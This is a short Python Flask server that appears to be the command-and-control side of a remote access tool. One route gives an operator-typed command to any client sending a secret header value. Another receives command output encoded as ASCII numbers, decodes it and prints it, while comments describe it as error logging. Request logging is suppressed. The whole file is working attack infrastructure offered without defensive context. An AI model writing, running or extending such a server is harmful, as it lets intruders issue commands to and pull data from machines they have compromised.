from flask import Flask, request, jsonify
import sys
app = Flask(__name__)
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
n = len (sys.argv)
try:
    ID = sys.argv[1]
except:
    sys.exit(1)

@app.route("/berzerkget")
def hello_world():
    obj1 = request.headers.get('X-1412-93e6')
    # print(obj1)
    if obj1 == ID:
        try:
            cmd = input("vyros: ")
        except:
            cmd = 'None'
        return cmd
    return 'None'

@app.route("/berzerkpost", methods = ["POST"])
def handle_post_request():
    try:
        # Get the request body as string
        data = request.get_data(as_text=True)

        # Entire received data is treated as the error message
        error_message = data
        # error_message = chr(error_message)
        # Print the received error message
        # print("output:", error_message)
        ascii_values = error_message.split()

# Convert each ASCII value to its corresponding character and concatenate them
        result_string = ''.join(chr(int(ascii_val)) for ascii_val in ascii_values)
        # Process the error message as needed
        # Example: Log error message to a file
        print('output: ', result_string)
        return "Data received successfully"
    except Exception as e:
        # Handle any errors
        print("Error processing request:", e)
        return "Error processing request", 400  


app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
